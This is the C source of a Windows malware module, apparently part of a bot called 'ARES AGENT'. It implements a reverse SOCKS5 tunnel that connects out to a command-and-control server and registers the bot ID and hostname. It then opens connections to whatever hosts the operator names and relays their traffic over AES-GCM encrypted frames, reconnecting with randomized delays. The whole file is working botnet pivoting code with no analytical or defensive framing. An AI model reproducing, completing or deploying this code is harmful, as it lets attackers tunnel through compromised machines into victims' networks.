/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — SOCKS5 Relay Client (Reverse Tunnel)
 *  
 *  BINARY LENGTH-PREFIXED FRAMING:
 *    [1 byte: type] [4 bytes: session_id BE] [4 bytes: payload_len BE] [payload]
 *
 *  Types:
 *    0x01 = RELAY_HANDSHAKE  (bot→c2)   payload = bot_id\0hostname
 *    0x02 = RELAY_ACK        (c2→bot)   payload = empty
 *    0x10 = CONNECT          (c2→bot)   payload = host:port
 *    0x11 = CONNECT_OK       (bot→c2)   payload = empty
 *    0x12 = CONNECT_ERR      (bot→c2)   payload = error_msg
 *    0x20 = DATA             (bidir)    payload = raw binary
 *    0x30 = CLOSE            (bidir)    payload = empty
 *
 *  Multi-session architecture with CRITICAL_SECTION protection.
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#include "tunnel_crypto.h"
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

/* ── Frame types ── */
#define FRAME_HANDSHAKE  0x01
#define FRAME_ACK        0x02
#define FRAME_CONNECT    0x10
#define FRAME_CONNECT_OK 0x11
#define FRAME_CONNECT_ERR 0x12
#define FRAME_DATA       0x20
#define FRAME_CLOSE      0x30

/* ── Session table ── */
#define MAX_SOCKS5_SESSIONS 64

typedef struct {
    int            session_id;
    SOCKET         target;
    HANDLE         thread;
    volatile BOOL  alive;
} SOCKS5_SESSION;

static volatile BOOL g_socks5_running = FALSE;
static HANDLE g_socks5_thread = NULL;
static SOCKET g_tunnel_socket = INVALID_SOCKET;
static SOCKS5_SESSION g_sessions[MAX_SOCKS5_SESSIONS];
static CRITICAL_SECTION g_tunnel_lock;

static void init_session_table(void) {
    InitializeCriticalSection(&g_tunnel_lock);
    for (int i = 0; i < MAX_SOCKS5_SESSIONS; i++) {
        g_sessions[i].session_id = -1;
        g_sessions[i].target = INVALID_SOCKET;
        g_sessions[i].thread = NULL;
        g_sessions[i].alive = FALSE;
    }
}

static SOCKS5_SESSION* alloc_session(int session_id, SOCKET target) {
    for (int i = 0; i < MAX_SOCKS5_SESSIONS; i++) {
        if (!g_sessions[i].alive) {
            g_sessions[i].session_id = session_id;
            g_sessions[i].target = target;
            g_sessions[i].alive = TRUE;
            return &g_sessions[i];
        }
    }
    return NULL;
}

static void free_session(SOCKS5_SESSION* s) {
    if (s->target != INVALID_SOCKET) {
        closesocket(s->target);
        s->target = INVALID_SOCKET;
    }
    s->alive = FALSE;
    s->session_id = -1;
}

static SOCKS5_SESSION* find_session(int session_id) {
    for (int i = 0; i < MAX_SOCKS5_SESSIONS; i++) {
        if (g_sessions[i].alive && g_sessions[i].session_id == session_id)
            return &g_sessions[i];
    }
    return NULL;
}

/* ── Binary frame helpers ── */

static inline void put_be32(BYTE* buf, DWORD val) {
    buf[0] = (BYTE)(val >> 24);
    buf[1] = (BYTE)(val >> 16);
    buf[2] = (BYTE)(val >> 8);
    buf[3] = (BYTE)(val);
}

static inline DWORD get_be32(const BYTE* buf) {
    return ((DWORD)buf[0] << 24) | ((DWORD)buf[1] << 16) |
           ((DWORD)buf[2] << 8) | (DWORD)buf[3];
}

/* v5.0: AES-256-GCM tunnel encryption (replaces XOR) */

/* Send a binary frame with AES-GCM encryption:
 * Plaintext: [type:1][session_id:4][payload_len:4][payload]
 * Wire: [total_len:4][nonce:12][ciphertext][tag:16] */
static void send_frame(BYTE type, int session_id, const BYTE* payload, int payload_len) {
    /* Build plaintext frame: [type:1][session_id:4][payload_len:4][payload] */
    int plain_len = 9 + payload_len;
    BYTE* plaintext = (BYTE*)HeapAlloc(GetProcessHeap(), 0, plain_len);
    if (!plaintext) return;

    plaintext[0] = type;
    put_be32(plaintext + 1, (DWORD)session_id);
    put_be32(plaintext + 5, (DWORD)payload_len);
    if (payload_len > 0 && payload)
        memcpy(plaintext + 9, payload, payload_len);

    EnterCriticalSection(&g_tunnel_lock);
    if (g_tunnel_socket != INVALID_SOCKET && g_socks5_crypto.initialized) {
        int wire_len = 0;
        BYTE* encrypted = tunnel_encrypt_frame(&g_socks5_crypto,
            plaintext, plain_len, &wire_len);
        if (encrypted) {
            send(g_tunnel_socket, (char*)encrypted, wire_len, 0);
            HeapFree(GetProcessHeap(), 0, encrypted);
        }
    }
    LeaveCriticalSection(&g_tunnel_lock);
    HeapFree(GetProcessHeap(), 0, plaintext);
}

/* Recv exactly N bytes (blocking) */
static int recv_exact(SOCKET s, BYTE* buf, int needed) {
    int total = 0;
    while (total < needed) {
        int n = recv(s, (char*)(buf + total), needed - total, 0);
        if (n <= 0) return -1;
        total += n;
    }
    return total;
}

/* v5.0: Read one AES-GCM encrypted frame from tunnel.
 * Wire format: [total_len:4][nonce:12][ciphertext][tag:16]
 * Decrypted plaintext: [type:1][session_id:4][payload_len:4][payload] */
static int recv_frame(SOCKET s, BYTE* type, int* session_id,
    BYTE* payload, int payload_max, int* payload_len)
{
    /* Step 1: Read 4-byte length prefix */
    BYTE len_buf[4];
    if (recv_exact(s, len_buf, 4) != 4) return -1;
    int enc_total = (int)get_be32(len_buf); /* nonce + ct + tag */
    if (enc_total < 12 + 16 + 9 || enc_total > 1024 * 1024 + 128) return -1;

    /* Step 2: Read encrypted blob */
    BYTE* enc_buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, enc_total);
    if (!enc_buf) return -1;
    if (recv_exact(s, enc_buf, enc_total) != enc_total) {
        HeapFree(GetProcessHeap(), 0, enc_buf);
        return -1;
    }

    /* Step 3: AES-GCM decrypt */
    int plain_max = enc_total; /* plaintext <= encrypted */
    BYTE* plaintext = (BYTE*)HeapAlloc(GetProcessHeap(), 0, plain_max);
    if (!plaintext) {
        HeapFree(GetProcessHeap(), 0, enc_buf);
        return -1;
    }
    int plain_len = tunnel_decrypt_frame(&g_socks5_crypto,
        enc_buf, enc_total, plaintext, plain_max);
    HeapFree(GetProcessHeap(), 0, enc_buf);

    if (plain_len < 9) {
        HeapFree(GetProcessHeap(), 0, plaintext);
        return -1; /* tampered or too short */
    }

    /* Step 4: Parse decrypted frame */
    *type = plaintext[0];
    *session_id = (int)get_be32(plaintext + 1);
    *payload_len = (int)get_be32(plaintext + 5);

    if (*payload_len < 0 || *payload_len > payload_max || 9 + *payload_len > plain_len) {
        HeapFree(GetProcessHeap(), 0, plaintext);
        return -1;
    }

    if (*payload_len > 0)
        memcpy(payload, plaintext + 9, *payload_len);

    HeapFree(GetProcessHeap(), 0, plaintext);
    return 0;
}

/* ── Per-session relay thread ── */
static DWORD WINAPI session_relay_thread(LPVOID param)
{
    SOCKS5_SESSION* sess = (SOCKS5_SESSION*)param;
    BYTE buf[32768];

    u_long nb = 1;
    ioctlsocket(sess->target, FIONBIO, &nb);

    while (g_socks5_running && sess->alive) {
        int n = recv(sess->target, (char*)buf, sizeof(buf), 0);
        if (n > 0) {
            /* Binary DATA frame — safe for null/newline/any byte */
            send_frame(FRAME_DATA, sess->session_id, buf, n);
        } else if (n == 0) {
            send_frame(FRAME_CLOSE, sess->session_id, NULL, 0);
            break;
        } else {
            int err = WSAGetLastError();
            if (err != WSAEWOULDBLOCK) {
                send_frame(FRAME_CLOSE, sess->session_id, NULL, 0);
                break;
            }
            Sleep(5);
        }
    }

    free_session(sess);
    return 0;
}

/* ── Tunnel Thread ── */
static DWORD WINAPI socks5_thread_proc(LPVOID param)
{
    AGENT_STATE* state = (AGENT_STATE*)param;
    char c2_host[256];
    int c2_port = 9090;

    strncpy(c2_host, state->config.c2_endpoints[0], 255);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    init_session_table();

    while (g_socks5_running) {
        struct addrinfo hints = {0}, *result = NULL;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        char port_str[16];
        snprintf(port_str, sizeof(port_str), "%d", c2_port);

        if (getaddrinfo(c2_host, port_str, &hints, &result) != 0) {
            Sleep(5000);
            continue;
        }

        g_tunnel_socket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (g_tunnel_socket == INVALID_SOCKET) {
            freeaddrinfo(result);
            Sleep(5000);
            continue;
        }

        if (connect(g_tunnel_socket, result->ai_addr, (int)result->ai_addrlen) != 0) {
            freeaddrinfo(result);
            closesocket(g_tunnel_socket);
            g_tunnel_socket = INVALID_SOCKET;
            Sleep(3000 + (rand() % 5000));
            continue;
        }
        freeaddrinfo(result);

        /* v5.0: AES-GCM Handshake — generate session key, send in plaintext header
         * (safe: tunnel goes through CF Tunnel TLS). Format:
         * [magic:4 "AE5\x00"][session_key:32][bot_id_len:1][bot_id][hostname]
         * Server responds: [magic:4 "AE5K"] = AES key accepted */
        BYTE session_key[32];
        tunnel_generate_session_key(session_key);
        tunnel_crypto_init(&g_socks5_crypto, session_key);

        extern char g_bot_id_global[64];
        const char* bid = g_bot_id_global[0] ? g_bot_id_global : "bot";
        int bid_len = (int)strlen(bid);
        int host_len = (int)strlen(state->hostname);
        int hs_total = 4 + 32 + 1 + bid_len + host_len;
        BYTE hs_buf[512];
        /* Magic */
        hs_buf[0] = 'A'; hs_buf[1] = 'E'; hs_buf[2] = '5'; hs_buf[3] = 0x00;
        /* Session key */
        memcpy(hs_buf + 4, session_key, 32);
        /* Bot ID */
        hs_buf[36] = (BYTE)bid_len;
        memcpy(hs_buf + 37, bid, bid_len);
        /* Hostname */
        memcpy(hs_buf + 37 + bid_len, state->hostname, host_len);

        /* Send plaintext handshake */
        send(g_tunnel_socket, (char*)hs_buf, hs_total, 0);
        SecureZeroMemory(session_key, 32);
        SecureZeroMemory(hs_buf + 4, 32); /* wipe key from stack buffer */

        /* Wait for server ACK: [magic:4 "AE5K"] */
        BYTE ack_buf[4];
        if (recv_exact(g_tunnel_socket, ack_buf, 4) != 4 ||
            ack_buf[0] != 'A' || ack_buf[1] != 'E' ||
            ack_buf[2] != '5' || ack_buf[3] != 'K') {
            tunnel_crypto_destroy(&g_socks5_crypto);
            closesocket(g_tunnel_socket);
            g_tunnel_socket = INVALID_SOCKET;
            Sleep(3000);
            continue;
        }

        /* ── Command loop — binary framing ── */
        BYTE* cmd_payload = (BYTE*)HeapAlloc(GetProcessHeap(), 0, 65536);
        while (g_socks5_running) {
            BYTE frame_type;
            int sid, plen;
            if (recv_frame(g_tunnel_socket, &frame_type, &sid, cmd_payload, 65536, &plen) != 0)
                break;

            if (frame_type == FRAME_CONNECT) {
                /* payload = "host:port" */
                cmd_payload[plen] = '\0';
                char* target_str = (char*)cmd_payload;
                char* colon = strrchr(target_str, ':');
                if (colon) {
                    *colon = '\0';
                    int port = atoi(colon + 1);

                    struct addrinfo h2 = {0}, *r2 = NULL;
                    h2.ai_family = AF_INET;
                    h2.ai_socktype = SOCK_STREAM;
                    char ps[16];
                    snprintf(ps, sizeof(ps), "%d", port);

                    if (getaddrinfo(target_str, ps, &h2, &r2) == 0) {
                        SOCKET ts = socket(r2->ai_family, r2->ai_socktype, r2->ai_protocol);
                        if (ts != INVALID_SOCKET && connect(ts, r2->ai_addr, (int)r2->ai_addrlen) == 0) {
                            SOCKS5_SESSION* sess = alloc_session(sid, ts);
                            if (sess) {
                                send_frame(FRAME_CONNECT_OK, sid, NULL, 0);
                                sess->thread = CreateThread(NULL, 0, session_relay_thread, sess, 0, NULL);
                                if (sess->thread) {
                                    CloseHandle(sess->thread);
                                    sess->thread = NULL;
                                }
                            } else {
                                closesocket(ts);
                                send_frame(FRAME_CONNECT_ERR, sid, (BYTE*)"max_sessions", 12);
                            }
                        } else {
                            send_frame(FRAME_CONNECT_ERR, sid, (BYTE*)"connect_fail", 12);
                            if (ts != INVALID_SOCKET) closesocket(ts);
                        }
                        freeaddrinfo(r2);
                    } else {
                        send_frame(FRAME_CONNECT_ERR, sid, (BYTE*)"dns_fail", 8);
                    }
                }
            }
            else if (frame_type == FRAME_DATA) {
                /* Forward binary payload to target — safe for any byte */
                SOCKS5_SESSION* sess = find_session(sid);
                if (sess && sess->target != INVALID_SOCKET)
                    send(sess->target, (char*)cmd_payload, plen, 0);
            }
            else if (frame_type == FRAME_CLOSE) {
                SOCKS5_SESSION* sess = find_session(sid);
                if (sess) sess->alive = FALSE;
            }
        }
        HeapFree(GetProcessHeap(), 0, cmd_payload);

        /* Cleanup all sessions */
        for (int i = 0; i < MAX_SOCKS5_SESSIONS; i++) {
            if (g_sessions[i].alive) free_session(&g_sessions[i]);
        }

        closesocket(g_tunnel_socket);
        g_tunnel_socket = INVALID_SOCKET;

        if (g_socks5_running) Sleep(3000 + (rand() % 7000));
    }

    DeleteCriticalSection(&g_tunnel_lock);
    WSACleanup();
    return 0;
}

/* ── Public API ── */

BOOL Ares_Socks5_Start(AGENT_STATE* state, const char* listen_host, int port)
{
    if (g_socks5_running) return TRUE;

    g_socks5_running = TRUE;
    g_socks5_thread = CreateThread(NULL, 0, socks5_thread_proc, state, 0, NULL);
    return g_socks5_thread != NULL;
}

void Ares_Socks5_Stop(void)
{
    g_socks5_running = FALSE;

    for (int i = 0; i < MAX_SOCKS5_SESSIONS; i++) {
        if (g_sessions[i].alive) free_session(&g_sessions[i]);
    }

    if (g_tunnel_socket != INVALID_SOCKET) {
        closesocket(g_tunnel_socket);
        g_tunnel_socket = INVALID_SOCKET;
    }
    if (g_socks5_thread) {
        WaitForSingleObject(g_socks5_thread, 5000);
        CloseHandle(g_socks5_thread);
        g_socks5_thread = NULL;
    }
}
